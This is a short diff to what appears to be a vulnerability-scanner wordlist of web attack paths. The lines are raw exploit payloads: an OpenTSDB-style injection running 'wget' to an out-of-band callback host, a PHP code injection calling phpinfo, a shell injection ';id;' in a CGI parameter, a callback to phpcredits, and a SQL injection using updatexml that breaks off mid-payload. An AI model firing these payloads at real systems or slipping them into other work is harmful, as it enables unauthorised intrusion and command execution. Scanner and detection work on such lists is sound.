@@ -67,3 +67,6 @@
 /q?start=2000/10/21-00:00:00&end=2020/10/25-15:56:44&m=sum:sys.cpu.nice&o=&ylabel=&xrange=10:10&yrange=[33:system(%27wget%20http://interact.sh%27)]&wxh=1516x644&style=linespoint&baba=lala&grid=t&json
 /auth/requestreset
 /webGui/images/green-on.png/?path=x&site[x][text]=%3C?php%20phpinfo();%20?%3E
+/cgi-bin/live_api.cgi?page={{str}}&id={{num}}&ip=;id;
+/nette.micro/?callback=phpcredits
+/public/index.php/home/index/bind_follow/?publicid=1&is_ajax=1&uid[0]=exp&uid[1]=)%20and%20updatexml(1,concat(0x7e,md5(
